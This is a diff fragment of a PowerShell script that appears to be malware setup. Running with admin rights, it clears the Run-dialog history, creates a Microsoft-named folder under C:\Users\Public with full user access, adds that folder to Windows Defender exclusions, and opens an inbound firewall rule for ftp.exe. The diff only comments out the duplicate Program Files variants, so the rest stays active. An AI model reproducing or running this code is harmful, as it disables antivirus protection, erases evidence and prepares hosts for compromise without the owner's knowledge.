@@ -24,11 +24,11 @@ if(Test-IsAdmin) # Check privileges
     Remove-Item HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU -erroraction 'silentlycontinue';
 
     md "C:\Users\Public\Microsoft" >$null;
-    md "C:\Program Files\Common Files\Microsoft" -erroraction 'silentlycontinue' >$null;
+    #md "C:\Program Files\Common Files\Microsoft" -erroraction 'silentlycontinue' >$null;
     icacls "C:\Users\Public\Microsoft" /q /c /t /grant Users:F >$null;
-    icacls "C:\Program Files\Common Files\Microsoft" /q /c /t /grant Users:F >$null;
+    #icacls "C:\Program Files\Common Files\Microsoft" /q /c /t /grant Users:F >$null;
     Add-MpPreference -ExclusionPath 'C:\Users\Public\Microsoft' >$null;
-    Add-MpPreference -ExclusionPath 'C:\Program Files\Common Files\Microsoft' >$null;
+    #Add-MpPreference -ExclusionPath 'C:\Program Files\Common Files\Microsoft' >$null;
     
     echo "Setting up Firewall";
     New-NetFirewallRule -DisplayName "FTP-in"  -Direction Inbound -Program "C:\\Windows\\system32\\ftp.exe" -Action Allow >$null;
